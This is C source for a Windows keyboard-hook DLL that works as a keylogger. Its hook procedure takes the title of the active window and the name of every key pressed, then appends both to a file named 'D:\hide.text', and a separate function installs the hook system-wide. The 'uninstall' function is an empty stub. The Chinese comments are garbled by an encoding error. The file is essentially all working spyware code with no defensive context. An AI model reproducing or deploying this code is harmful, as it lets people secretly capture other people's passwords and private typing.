#define _CRT_SECURE_NO_WARNINGS

#include"KeyHook.h"
LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	//MessageBox(NULL, L"���˰�����", L"��ʾ", NULL);
	HWND hWnd = GetActiveWindow();
	if (NULL == hWnd)//��ȡ�����ʧ��
	{
		hWnd = GetForegroundWindow();
		if (NULL == hWnd)//��ȡ���㴰��ʧ��
		{
			//���ΰ�����Ϣ������
			return CallNextHookEx(hHook, code, wParam, lParam);
		}
	}
	//��ȡ���ڱ���
	char windowText[256] = { 0 };
	GetWindowTextA(hWnd, windowText, 255);
	//MessageBox(NULL, windowText, "���ڱ���", NULL);

	if((code<0) | (code == HC_NOREMOVE))
		return CallNextHookEx(hHook, code, wParam, lParam);
	if (lParam & 0x40000000)
		return CallNextHookEx(hHook, code, wParam, lParam);
	//��ȡ�����ı�
	char keyText[256] = { 0 };
	GetKeyNameText(lParam, keyText, 255);
	//MessageBox(NULL, keyText, "�����ı�", NULL);

	//д���ļ���
	char textForWrite[256] = { 0 };
	sprintf(textForWrite, "%s:%s\n", windowText, keyText);
	FILE* fp = fopen("D:\\hide.text", "a");
	if(NULL == fp)return CallNextHookEx(hHook, code, wParam, lParam);
	fwrite(textForWrite, 1, strlen(textForWrite), fp);
	fclose(fp);

	return CallNextHookEx(hHook,code,wParam,lParam);
}

bool installHook()//��װ����
{
	//MessageBox(NULL, "��װ����", "��ʾ", NULL);
	hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, GetModuleHandle("KeyHook"),NULL);
	if (NULL == hHook)
	{
		//MessageBox(NULL, "��װ����ʧ��", "��ʾ", NULL);
		return false;
	}
	//MessageBox(NULL, "��װ���ӳɹ�", "��ʾ", NULL);
	return true;
}

bool uninstallHook()//ж�ع���
{
	//MessageBox(NULL, "ж�ع���", "��ʾ", NULL);
	return true;
}

